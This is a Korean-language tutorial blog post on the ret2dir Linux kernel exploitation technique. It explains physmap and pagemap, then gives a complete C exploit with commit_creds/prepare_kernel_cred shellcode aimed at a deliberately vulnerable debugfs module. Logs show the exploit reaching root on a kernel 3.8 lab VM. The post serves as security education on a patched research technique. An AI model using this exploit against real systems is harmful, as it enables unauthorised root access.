---
title: Return-to-direct-mapped Memory
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, return-to-direct-mapped memory]
math: true
mermaid: true
---

## Description

ret2dir은 물리적메모리 영역에 잘못된 권한 설정을 악용하는 기법이다. 최신 커널에선 모두 수정되었다.

## Virtual memory

virtual memory는 메모리 관리 방법의 하나로, 각 프로그램에 물리적 주소가 아닌 가상의 메모리 주소를 사용하는 방식이다. 멀티태스킹 운영체제에서 흔히 사용되며, 주기억장치(RAM)보다 큰 메모리 영역을 제공하는 방법으로도 사용된다. virtual memory는 MMU에 의해 물리주소로 변환된다.

## MMU(Memory Management unit)

페이징 메모리 관리 장치(PMMU)라고도 하는 메모리 관리 장치(MMU)는 CPU가 메모리에 접근하는 것을 관리하는 컴퓨터 하드웨어 부품이다. MMU는 virtual memory addresses를 physical addresses 주소로 변환해준다. MMU는 virtual memory 관리를 효과적으로 수행하며, 메모리 보호, 캐시 제어, 버스 조정 등을 처리한다.

## Virtual address space

컴퓨팅에서 virtual address space 또는 주소 공간은 운영체제에서 프로세스에 사용되는 일련의 가상 주소 집합이다. 가상 주소의 범위는 일반적으로 낮은 주소에서 시작하여 컴퓨터의 명령어 세트 아키텍처에서 허용되는 최상위 주소로 확장될 수 있다. 운영체제의 포인터 크기 구현에 의해 지원된다.

## Page Table

page table은 가상주소와 물리주소 간 매핑을 저장하기 위해 컴퓨터 운영체제의 가상 메모리 시스템이 사용하는 데이터 구조이다. 가상주소는 액세스 프로세스에 의해 실행되는 프로그램에 의해 사용되는 반면 물리적 주소는 하드웨어, 특히 RAM 서브시템에 의해 사용된다.

## Virtual memory map with 4 level page tables(x86-64)

4 level page tables를 사용하여 virtual addresses를 physical addresses에 매핑할 때 사용되는 메모리 영역 정보이다. “ffff880000000000 - ffffc7ffffffffff" 영역은 user page와 physical memory 직접적으로 매핑된다. 해당 영역과 매핑된 virtual adress 영역을 physmap 영역이라고 한다. ret2dir의 핵심이다.

|Areas|Size|Description|
|:---:|:---:|:---:|
|0000000000000000 - 00007fffffffffff|47|bits|user space, different per mm hole caused by [48:63] sign extension|
|ffff800000000000 - ffff80ffffffffff|40|bits|guard hole|
|ffff880000000000 - ffffc7ffffffffff|64|TB|direct mapping of all phys. memory|
|ffffc80000000000 - ffffc8ffffffffff|40|bits|hole|
|ffffc90000000000 - ffffe8ffffffffff|45|bits|vmalloc/ioremap space|
|ffffe90000000000 - ffffe9ffffffffff|40|bits|hole|
|ffffea0000000000 - ffffeaffffffffff|40|bits|virtual memory map (1TB) … unused hole …|
|ffffffff80000000 - ffffffffa0000000|512|MB|kernel text mapping, from phys 0|
|ffffffffa0000000 - fffffffffff00000|1536|MB|module mapping space|

## physmap characteristics across different architectures(x86, x86-64, AArch32, AArch64)

x86에서 physmap은 “RW"로 매핑되어 있었다. 그러나 x86-64에서 physmap의 사용 권한은 정상 상태가 아니였다고 한다. v3.8.13까지 커널은 전체 영역을 “읽기 가능, 쓰기 가능 및 실행 가능"(RWX)로 매핑하여 W^X 속성을 위반한다. AArch32, AArch64도 physmap의 권한이 RWX이다. 이를 통해 physical memory 영역에 shellcode를 저장하고 실행할 수 있다.

|Architecture|PHYS_OFFSET|Size|Prot|
|:---:|:---:|:---:|:---:|
|x86|(3G/1G)|0xC0000000|891MB|
|x86|(2G/1G)|0x80000000|1915MB|
|x86|(1G/1G)|0x40000000|2939MB|
|AArch32|(3G/1G)|0xC0000000|760MB|
|AArch32|(2G/1G)|0x80000000|1784MB|
|AArch32|(1G/1G)|0x40000000|2808MB|
|x86-64||0xFFFF880000000000|64TB|
|AArch64|(3G/1G)|0xFFFFFFC000000000|256GB|

## pagemap file

일반 유저 프로그램에서 physmap 영역에 데이터를 쓰기 위해 physmap과 매핑된 virtual memory addresses가 필요하다. virtual page에 매핑된 physical addresses를 찾기 위해 “pagemap" 파일을 사용한다. 이 파일은 virtual page와 process의 physical addersses 사이 맵 정보를 포함한다. 이 파일을 사용하면 사용자 공간 프로세스가 각 Virtual page가 실제 매핑되는 프레임을 찾을 수 있다. 여기에 다음 데이터를 포함하는 각 가상 페이지에 대한 하나의 64bit 값이 들어 있다.

ret2dir 공격에 필요한 필드 값은 2가지이다. “present" 또는 “present bit"으로 불리는 값과 PFN(Page Frame Number)이다. PFN을 이용하여 virtual page에 매핑된 물리적 주소를 찾을 수 있다.

## present bit

- 해당 값이 “0"일 경우 페이지는 메모리에 있지 않고 디스크에 존재
- 해당 값이 “1"일 경우 페이지가 physical addresses에 존재

|Bits|Description|
|:---:|:---:|
|0-54|page frame number (PFN) if present|
|0-4|swap type if swapped|
|5-54|swap offset if swapped|
|55|pte is soft-dirty (see Documentation/vm/soft-dirty.txt)|
|56|page exclusively mapped (since 4.2)|
|57-60|zero|
|61|page is file-page or shared-anon (since 3.5)|
|62|page swapped|
|63|page present|

# Example

ret2dir 기술은 x86-64에서 v3.8.13 버전 까지 테스트가 가능하며, 최신 커널(≥ v3.9)에서는 앞에서 설명한데로 패치가 진행되어 아래 예제 파일들로 root권한을 획득할 수 없다.

- 예제 다운로드(ID:w00t, PW:pwn3d)
- [http://www.cs.columbia.edu/~vpk/research/ret2dir/](http://www.cs.columbia.edu/~vpk/research/ret2dir/)

2 processor 사용되고, smep가 적용되었다.

```bash
w00t@vlux:~/ekit$ cat /proc/cpuinfo |grep flags
flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lmconstant_tsc arch_perfmon pebs bts nopl xtopology tsc_reliable nonstop_tsc aperfmperf eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbepopcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm ida arat epb xsaveopt pln pts dtherm fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid

flags       : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts mmx fxsr sse sse2 ss syscall nx pdpe1gb rdtscp lmconstant_tsc arch_perfmon pebs bts nopl xtopology tsc_reliable nonstop_tsc aperfmperf eagerfpu pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbepopcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm ida arat epb xsaveopt pln pts dtherm fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid
w00t@vlux:~/ekit$
```

제공된 VM에서 ret2dir 취약점 테스트 가능하다.

```bash
w00t@vlux:~$ cd ekit/
w00t@vlux:~/ekit$ ls
include  ret2dir  ret2usr  runme  utils
w00t@vlux:~/ekit$ ./runme
|=-------------------------------------------------------------------------=|
|=------[ Return-to-direct-mapped memory (ret2dir) Exploitation Kit ]------=|
|=-------------------------------------------------------------------------=|
|=-------[ Network Security Lab (NSL) # http://nsl.cs.columbia.edu ]-------=|
|=-------------------------[ Columbia University ]-------------------------=|
|=-------------[ Vasileios P. Kemerlis (vpk@cs.columbia.edu) ]-------------=|
|=-------------------[ http://www.cs.columbia.edu/~vpk ]-------------------=|
|=-------------------------------------------------------------------------=|

Kernel version  : 3.8.0-19-generic
Prot. (ret2usr) : SMEP [+] SMAP [-] KERNEXEC [-] UDEREF [-]
CPU     : Intel(R) Core(TM) i7-4771 CPU @ 3.50GHz (#2)
RAM     : 1988 MB

Available exploits:
[1] PERF_EVENTS
    EDB-ID: 26131 (http://www.exploit-db.com/exploits/26131/)
    CVE-ID: 2013-2094 (signedness error)
[2] kernwrite
    EDB-ID: NONE
    CVE-ID: NONE (function/data pointer overwrite)
[0] Exit
> 2
Available variants:
>[1] ret2dir
    Bypasses: SMEP, SMAP, KERNEXEC, UDEREF
[2] ret2usr
[0] Exit
> 1
<-f/--fptr> or <-d/--dptr> > f
kernwrite_amd64: [Warn] `mode' was not specified -- using -f (--fptr)
kernwrite_amd64: [Warn] invalid `prepare_kernel_cred' address -- 0
[*] `prepare_kernel_cred' at 0xffffffff81086870
kernwrite_amd64: [Warn] invalid `commit_creds' address -- 0
[*] `commit_creds' at 0xffffffff810865f0        
[*] 0x7fcc9715d000 is kernel-mapped at 0xffff88002d3ba000
[+] shellcode is at 0xffff88002d3ba000
[+] p0wned [^_-]
# id
uid=0(root) gid=0(root) groups=0(root)
#
```

### kernwrite.c - kernwrite_init()

```c
// kernwrite.c - kernwrite_init()
...
 
/*
 * struct dummy_ops
 *
 * definition of a dummy structure that contains
 * a function pointer and a generic data field
 */
struct dummy_ops {
    size_t val;
    ssize_t (*fptr)(void);
};
 
/*
 * a kernel-mapped `dummy_ops' structure
 */
static struct dummy_ops ops; // 함수 포인터와 size_t type의 데이터를 저장하는 dummy_ops 구조체 정의
 
/* a kernel-mapped data pointer to `ops' */
static struct dummy_ops *ops_ptr; // dummy_ops 구조체 타입의 변수(ops)와 포인터 변수 선언(*ops_ptr)
 
...
 
/* module loading callback */
static int
kernwrite_init(void)
{
    /* initialize the data pointer to `ops' */
    ops_ptr = &ops; // ops_ptr 변수에 ops 변수의 주소(&ops)를 저장
 
    /* create the kernwrite directory in debugfs */
    kernwrite_root = debugfs_create_dir("kernwrite", NULL);  // debugfs_create_dir() 함수를 이용해 debugfs에 "kernwrite" 디렉토리 생성
 
    /* failed */
    if (kernwrite_root == NULL) {
        /* verbose */
        printk(KERN_ERR "kernwrite: creating root dir failed\n");
        return -ENODEV;
    }
    // debugfs_create_file() 함수를 이용해 다음과 같은 파일 생성
    /* create the files with the appropriate `fops' struct and perms */
    over_func_ptr   = debugfs_create_file("over_func_ptr",
                        0222,
                        kernwrite_root,
                        NULL,
                        &over_func_fops);
     
    over_data_ptr   = debugfs_create_file("over_data_ptr",
                        0222,
                        kernwrite_root,
                        NULL,
                        &over_data_fops);
 
    invoke_func_ptr = debugfs_create_file("invoke_func",
                        0222,
                        kernwrite_root,
                        NULL,
                        &invoke_func_fops);
 
    /* error handling */
    if (over_func_ptr   == NULL ||
        over_data_ptr   == NULL ||
        invoke_func_ptr == NULL)
        goto out_err;
     
    /* return with success */
    return 0;
 
out_err:    /* cleanup */
    printk(KERN_ERR "kernwrite: creating files in root dir failed\n");
    cleanup_debugfs();
 
    /* return with failure */
    return -ENODEV;
}
```

### kernwrite.c - over_func()

```c
// 
/*
 * writing to the `over_func_ptr' file overwrites
 * the function pointer of `ops' with an arbitrary,
 * user-controlled value
 */
static ssize_t
over_func(struct file *f, const char __user *buf,
        size_t count, loff_t *off)
{
    /* address buffer */
    char addr[ADDR_SZ]; // 32byte 크기의 addr 생성
 
    /* cleanup */
    memset(addr, 0 , ADDR_SZ); // addr 초기화
 
    /* copy the buffer to kernel space */
    // 유저로부터 전달 받은 값을 addr 변수에 저장
    if (copy_from_user(addr,
            buf,
            (count < ADDR_SZ - 1) ? count : ADDR_SZ - 1)  != 0) {
        /* failed */
        printk(KERN_ERR
            "kernwrite: overwriting the function pointer failed\n");
        return -EINVAL;
    }
 
    /* overwrite the function pointer */
    // addr 변수에 저장된 문자열을 signed long으로 변환하여 ops.fptr에 저장
    ops.fptr    = (void *)simple_strtol(addr, NULL, 16);
    f->private_data = ops.fptr;
 
    /* verbose */
    printk(KERN_DEBUG
    "kernwrite: overwriting function pointer with 0x%p\n", ops.fptr);
 
    /* done! */
    return count;
}
```

### kernwrite.c - invoke_func()

```c
/*
 * writing to the `invoke_func' file calls
 * the `fptr' member of `ops' via `opt_ptr'
 */
static ssize_t
invoke_func(struct file *f, const char __user *buf, size_t count, loff_t *off)
{
    /* verbose */
    printk(KERN_DEBUG "kernwrite: executing at 0x%p\n", ops_ptr->fptr);
 
    /* do it */
    return ops_ptr->fptr(); // ops_ptr->fptr() 실행, 즉 유저로부터 전달 받은 주소 호출
}
```

## Proof of concept

“pagemap" 파일에서 얻은 PFN정보를 이용하여 가상 페이지(virtual page)에 맵핑된 물리적 주소(physical addresses)를 찾을 수 있다.

```c
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
 
/* constants */
#define PATH_SZ         32                  /* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK    (1ULL << 63)      /* get bit 63 from a 64-bit integer */
#define PFN_MASK        ((1ULL << 55) - 1)    /* get bits 0-54 from */
 
#define ALLOC_STEP    1024*1024*512         /* chunk of 512MB */
 
void querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];         /* path in /proc     */
    uint64_t         *pentry    = NULL;     /* pagemap entries    */
    FILE             *fp    = NULL;         /* pagemap file        */
     
    /* 페이지맵 항목 초기화 */
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL) 
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));
         
    memset(path, 0, PATH_SZ);

    /* pagemap 파일 주소를 path 변수에 저장 */
    if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ)        /* format the path variable */
        errx(4,"[Fail] invalid path for /proc/%d/pagemap -- %s",pid,path);
    
    /* 해당 파일을 읽음 */
    if ((fp = fopen(path, "r")) == NULL)                                    /* open the pagemap file */
        errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));
        
    /* 특정 위치로 건너뜀 */
    if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)      /* seek to the appropriate place */
        errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));   
         
    /* 지정한 만큼 데이터를 pentry 영역에 읽음 */
    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)                  /* read the corresponding pagemap entries */
        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));
    
    /* pnum 변수에 저장된 수 만큼 반복 */
    while (pnum > 0) {
        /* check the present bit */
        /* 64번째 bit의 값 확인 */
        if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
            printf("[*] present bit 0\n");
 
            /* proper accounting */
            pnum--;
             
            /* continue with the next page */
            continue;
        }
 
        /* verbose */
        printf("[*] Page Number %zd\n", pnum - 1);
        printf("[*] present bit 1\n");
        
        /* AND 연산을 이용해 PFN 영역(0~54bit)의 값을 추출 
        "(1ULL << 55) - 1" = 0x7FFFFFFFFFFFFF */
        printf("[*] PFN is %llu\n\n", pentry[pnum - 1] & PFN_MASK);
 
        /* proper accounting */
        pnum--;
    }
                             
    /* cleanup */
    fclose(fp);
    return;
}
     
void main()
{
    long psize;                         /* page size        */
    char     *code        = NULL;           /* shellcode buffer */
     
    /* get the page size */
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)  // 시스템 페이지 사이즈 정보 획득
    /* failed */
        errx(2,
             "[Fail] couldn't read page size -- %s",
             strerror(errno));
     
    /* allocate ALLOC_STEP bytes in user space */
    // 512MB 크기의 메모리 할당
    if ((code = mmap(NULL,
                     ALLOC_STEP,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0)) == MAP_FAILED)
    /* failed */
        errx(7,
             "[Fail] couldn't allocate memory -- %s", strerror(errno));
 
    /* see if user space is kernel-mapped */
    querypmap(getpid(),
                    (unsigned long)code,
                    psize,
                    ALLOC_STEP / psize);
     
}
```

**Page Number, PFN**

```
...
[*] Page Number 94423
[*] present bit 1
[*] PFN is 332817

[*] Page Number 94422
[*] present bit 1
[*] PFN is 332816

[*] Page Number 94421
[*] present bit 1
[*] PFN is 332815

[*] Page Number 94420
[*] present bit 1
[*] PFN is 332814

[*] Page Number 94419
[*] present bit 1
[*] PFN is 332813
...
```

### Find physical addresses mapped to virtual pages

virtual page에 매핑된 physical addresses를 찾는 방법

## Virtual page addresses

- 할당된 메모리의 시작 주소 + page number * page size = virtual page address
- 0x7F1A3582D000 + 131071 * 4096 = 0x7f1a5582c000 ## physical addresses
- (PFN * page size) + direct mapping of all phys.memory + (virtual page & (page size -1))
- (260299 * 4096) + 0xFFFF880000000000 + (0x7f1a5582c000 & (4096 - 1)) = 0xffff88003f8cb000
- ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));

```c
	#include <err.h>
	#include <errno.h>
	#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "shellcode.h"

/* constants */
#define PATH_SZ     32        /* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK    (1ULL << 63)     /* get bit 63 from a 64-bit integer */
#define PFN_MASK    ((1ULL << 55) - 1)    /* get bits 0-54 from */

#define ALLOC_STEP    1024*1024*512    /* chunk of 512MB */

#define PAGE_OFFSET    0xFFFF880000000000UL    /* kernel space */
#define KERN_EXEC_LOW    0xffff880001bfffffUL    /* exec range start */
#define KERN_EXEC_HIGH    0xffff880036000000UL    /* exec range end */
#define ADDR_SZ         16                      /* buffer size; 16 bytes */
#define SYMNAME_SZ      1024            /* maximum size of symbol name */

/* pagemap query result (see querypmap()) */
struct pmap_qres {
        unsigned long   btarget;        /* branch target        */
        size_t          pnum;           /* page number          */
};

struct  pmap_qres querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];         /* path in /proc     */
    uint64_t         *pentry    = NULL;     /* pagemap entries    */
    FILE             *fp    = NULL;         /* pagemap file        */
    unsigned long         kaddr    = 0;     /* helper */
    struct  pmap_qres rval;

    /* 페이지맵 항목 초기화 */
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));

    memset(path, 0, PATH_SZ);

    if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ)        /* format the path variable */
        errx(4,"[Fail] invalid path for /proc/%d/pagemap -- %s",pid,path);

    if ((fp = fopen(path, "r")) == NULL)                                    /* open the pagemap file */
        errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));

    if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)      /* seek to the appropriate place */
        errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));

    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)                  /* read the corresponding pagemap entries */
        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));

    vaddr += ((pnum - 1) * psize);
    while (pnum > 0) {
        /* check the present bit */
        if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
            warnx("[Warn] %#lx is not present in physical memory",vaddr);

            /* proper accounting */
            kaddr    = 0;
            vaddr    -= psize;
            pnum--;

            /* continue with the next page */
            continue;
        }

        /* get the kernel-mapped address of vaddr */
        kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));

        /* valid match ? */
        if (kaddr >= KERN_EXEC_LOW && kaddr <= KERN_EXEC_HIGH){
            printf("[*] Found KERN_EXEC Zone!\n\n");

            /* verbose */
            printf("[*] Page Number %zd\n", pnum - 1);
            printf("[*] present bit 1\n");
            printf("[*] PFN is %llu\n", pentry[pnum - 1] & PFN_MASK);
            printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,kaddr);

            rval.btarget = kaddr;
            rval.pnum = pnum - 1;
            /* yeah baby */
            break;
        }

        /* proper accounting */
        kaddr    = 0;
        vaddr    -= psize;
        pnum--;
    }

    /* cleanup */
    fclose(fp);

    return rval;
}

void main(int argc,char *argv[])
{
    long psize;                         /* page size        */
    char     *code        = NULL;           /* shellcode buffer */
    char    saddr[ADDR_SZ];
    unsigned long caddr,paddr;

    /* get the page size */
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)
    /* failed */
        errx(2,
             "[Fail] couldn't read page size -- %s",
             strerror(errno));

    /* allocate ALLOC_STEP bytes in user space */
    if ((code = mmap(NULL,
                     ALLOC_STEP,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0)) == MAP_FAILED)
    /* failed */
        errx(7,
             "[Fail] couldn't allocate memory -- %s", strerror(errno));

    struct  pmap_qres res;

    /* see if user space is kernel-mapped */
    res = querypmap(getpid(),
                    (unsigned long)code,
                    psize,
                    ALLOC_STEP / psize);

    printf("[*] res.pnum:%d\n",res.pnum);
    printf("[*] res.btarget:%lx\n",res.btarget);
}
```

유저 메모리에서는 물리 메모리에 데이터를 저장할 수 없다. 따라서 맵핑된 가상 페이지 주소를 이용해 데이터 저장한다. char형 포인터 변수 code에 페이지 번호와 페이지 사이즈를 곱한 값을 더한다.

- code 변수는 rwx 권한을 가지는 물리 메모리와 매핑된 가상 페이지 주소가 저장됨
- code += res.pnum * psize;

```c
/* shellcode stitching */
code += res.pnum * psize;
memcpy(code, shell_tmpl, SHELL_PREFIX); // shell_tmpl 변수에 저장된 8byte를 code 변수에 저장
            code += SHELL_PREFIX;
memcpy(code, &caddr, sizeof(unsigned)); // commit_creds() 주소를 code 변수에 저장
            code += sizeof(unsigned);
memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV); // shell_tmpl 변수에 저장된 3byte를 code 변수에 저장
            code += SHELL_ADV;
memcpy(code, &paddr, sizeof(unsigned)); // prepare_kernel_cred() 함수 주소를 code 변수에 저장
            code += sizeof(unsigned);
memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX); // shell_tmpl[] 24byte code에 저장
```

```c
// shellcode.h
#if
...
#elif   defined(__x86_64__) /* x86-64 */
#define SHELL_PREFIX    8       /* 8 bytes of "prefix" code */
#define SHELL_SUFFIX    24      /* 24 bytes of "suffix" code */
#define SHELL_ADV   3       /* 3 bytes of code advancement */
static char shell_tmpl[] =
        "\x55"          /* push %rbp        */
        "\x48\x89\xe5"      /* mov  %rsp, %rbp  */
        "\x53"          /* push %rbx        */
        "\x48\xc7\xc3"      /* mov  $<kaddr>, %rbx    */
        "\x48\xc7\xc0"      /* mov  $<kaddr>, %rax    */
    "\x48\xc7\xc7\x00\x00\x00\x00"  /* mov  $0x0, %rdi  */
        "\xff\xd0"      /* callq *%rax      */
        "\x48\x89\xc7"      /* mov  %rax, %rdi  */
        "\xff\xd3"      /* callq *%rbx      */
    "\x48\xc7\xc0\x00\x00\x00\x00"  /* mov  $0x0, %rax  */
        "\x5b"          /* pop  %rbx        */
        "\xc9"          /* leaveq       */
        "\xc3";         /* ret          */
#endif
```

### Execute shellcode from virtual memory address

가상 메모리의 주소로 전달할 경우 shellcode가 실행되지 않는다. KERN_EXEC_LOW, KERN_EXEC_HIGH를 0xffff880001bfffffUL, 0xffff880036000000UL로 변경한다. 변경하지 않을 경우 physical 영역의 권한 문제로 root를 획득하지 못하는 경우가 발생한다.

```c
// gcc exploit.c -o exploit
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "shellcode.h"

/* constants */
#define PATH_SZ     32        /* path size (/proc/<pid>/pagemap) */
#define PRESENT_MASK    (1ULL << 63)     /* get bit 63 from a 64-bit integer */
#define PFN_MASK    ((1ULL << 55) - 1)    /* get bits 0-54 from */

#define ALLOC_STEP    1024*1024*512    /* chunk of 512MB */

#define PAGE_OFFSET    0xFFFF880000000000UL    /* kernel space */
#define KERN_EXEC_LOW    0xffff880001bfffffUL    /* exec range start */
#define KERN_EXEC_HIGH    0xffff880036000000UL    /* exec range end */
#define ADDR_SZ         16                      /* buffer size; 16 bytes */
#define SYMNAME_SZ      1024            /* maximum size of symbol name */

/* pagemap query result (see querypmap()) */
struct pmap_qres {
        unsigned long   btarget;        /* branch target        */
        size_t          pnum;           /* page number          */
};

static unsigned long
get_ksym(char *name)
{
        /* file pointer */
        FILE    *f      = NULL;

        /* helpers      */
        char c, sym[SYMNAME_SZ];
        void     *addr  = NULL;

        /* open /proc/kallsyms */
        if ((f = fopen("/proc/kallsyms", "r")) == NULL)
                /* failed */
                errx(3,
                        "[Fail] couldn't open /proc/kallsyms -- %s",
                        strerror(errno));

        /* read kallsyms */
        while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
                if (strlen(sym) == strlen(name) &&
                                (strncmp(sym, name, strlen(sym)) == 0))
                        /* symbol found; return its address */
                        break;
                else
                        /* symbol not found */
                        addr = NULL;

        /* cleanup */
        fclose(f);

        /* return the symbol address (or 0)  */
        return (unsigned long)addr;
}

struct  pmap_qres querypmap(pid_t pid, unsigned long vaddr, long psize, size_t pnum)
{
    char             path[PATH_SZ];         /* path in /proc     */
    uint64_t         *pentry    = NULL;     /* pagemap entries    */
    FILE             *fp    = NULL;         /* pagemap file        */
    unsigned long         kaddr    = 0;     /* helper */
    struct  pmap_qres rval;

    /* 페이지맵 항목 초기화 */
    if ((pentry = calloc(pnum, sizeof(uint64_t))) == NULL)
        errx(7,"[Fail] couldn't allocate memory for pagemap entries -- %s",strerror(errno));

    memset(path, 0, PATH_SZ);

    if (snprintf(path, PATH_SZ, "/proc/%d/pagemap", pid) >= PATH_SZ)        /* format the path variable */
        errx(4,"[Fail] invalid path for /proc/%d/pagemap -- %s",pid,path);

    if ((fp = fopen(path, "r")) == NULL)                                    /* open the pagemap file */
        errx(4,"[Fail] couldn't open %s -- %s",path,strerror(errno));

    if (fseek(fp, (vaddr / psize) * sizeof(uint64_t), SEEK_CUR) == -1)      /* seek to the appropriate place */
        errx(5,"[Fail] couldn't seek in pagemap -- %s",strerror(errno));

    if (fread(pentry, sizeof(uint64_t), pnum, fp) != pnum)                  /* read the corresponding pagemap entries */
        errx(6,"[Fail] couldn't read pagemap entries -- %s",strerror(errno));

    vaddr += ((pnum - 1) * psize);
    while (pnum > 0) {
        /* check the present bit */
        if ((pentry[pnum - 1] & PRESENT_MASK) == 0) {
            warnx("[Warn] %#lx is not present in physical memory",vaddr);

            /* proper accounting */
            kaddr    = 0;
            vaddr    -= psize;
            pnum--;

            /* continue with the next page */
            continue;
        }

        /* get the kernel-mapped address of vaddr */
        kaddr = ((pentry[pnum - 1] & PFN_MASK) * psize) + PAGE_OFFSET + (vaddr & (psize - 1));

        /* valid match ? */
        if (kaddr >= KERN_EXEC_LOW && kaddr <= KERN_EXEC_HIGH){
            printf("[*] Found KERN_EXEC Zone!\n\n");

            /* verbose */
            printf("[*] Page Number %zd\n", pnum - 1);
            printf("[*] present bit 1\n");
            printf("[*] PFN is %llu\n", pentry[pnum - 1] & PFN_MASK);
            printf("[*] %#lx is kernel-mapped at %#lx\n\n",vaddr,kaddr);

            rval.btarget = kaddr;
            rval.pnum = pnum - 1;
            /* yeah baby */
            break;
        }

        /* proper accounting */
        kaddr    = 0;
        vaddr    -= psize;
        pnum--;
    }

    /* cleanup */
    fclose(fp);

    return rval;
}

void main(int argc,char *argv[])
{
    long psize;                         /* page size        */
    char     *code        = NULL;           /* shellcode buffer */
    char    saddr[ADDR_SZ];
    unsigned long caddr,paddr;

    /* get the page size */
    if ((psize = sysconf(_SC_PAGESIZE)) == -1)
    /* failed */
        errx(2,
             "[Fail] couldn't read page size -- %s",
             strerror(errno));

    /* allocate ALLOC_STEP bytes in user space */
    if ((code = mmap(NULL,
                     ALLOC_STEP,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                     -1,
                     0)) == MAP_FAILED)
    /* failed */
        errx(7,
             "[Fail] couldn't allocate memory -- %s", strerror(errno));

    struct  pmap_qres res;

    /* see if user space is kernel-mapped */
    res = querypmap(getpid(),
                    (unsigned long)code,
                    psize,
                    ALLOC_STEP / psize);

    printf("res.pnum:%d\n",res.pnum);
    printf("res.btarget:%lx\n",res.btarget);

    paddr = get_ksym("prepare_kernel_cred");
    caddr = get_ksym("commit_creds");

    printf("prepare_kernel_cred() - %lx\n",paddr);
    printf("commit_creds() - %lx\n",caddr);

    code += res.pnum * psize;
    memcpy(code, shell_tmpl, SHELL_PREFIX);
            code += SHELL_PREFIX;
    memcpy(code, &caddr, sizeof(unsigned));
            code += sizeof(unsigned);
    memcpy(code, &shell_tmpl[SHELL_PREFIX], SHELL_ADV);
            code += SHELL_ADV;
    memcpy(code, &paddr, sizeof(unsigned));
            code += sizeof(unsigned);
    memcpy(code, &shell_tmpl[SHELL_PREFIX + SHELL_ADV], SHELL_SUFFIX);

    memset(saddr,0,ADDR_SZ);
    sprintf(saddr,"%lx",res.btarget);
    fprintf(stdout,"shellcode addr: %s\n",saddr);

    int fd;

    fd = open("/sys/kernel/debug/kernwrite/over_func_ptr",O_WRONLY);
    write(fd,saddr,strlen(saddr));
    close(fd);

    fd = open("/sys/kernel/debug/kernwrite/invoke_func",O_WRONLY);
    write(fd,"1",1);
    close(fd);

    if(getuid() == 0){
            fprintf(stderr,"pwn3d\n");
            execve("/bin/sh",argv,NULL);
    }

}
```

## Exploit

```bash
w00t@vlux:~$ ./exploit
[*] Found KERN_EXEC Zone!
[*] Page Number 9015
[*] present bit 1
[*] PFN is 152063
[*] 0x7fc194ecd000 is kernel-mapped at 0xffff8800251ff000
res.pnum:9015
res.btarget:ffff8800251ff000
prepare_kernel_cred() - ffffffff81086870
commit_creds() - ffffffff810865f0
shellcode addr: ffff8800251ff000
pwn3d
# id
uid=0(root) gid=0(root) groups=0(root)
```

## References

- [08.ret2dir(return-to-direct-mapped memory)](https://www.lazenca.net/pages/viewpage.action?pageId=25624881)
- [ret2dir: Rethinking Kernel Isolation](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf)
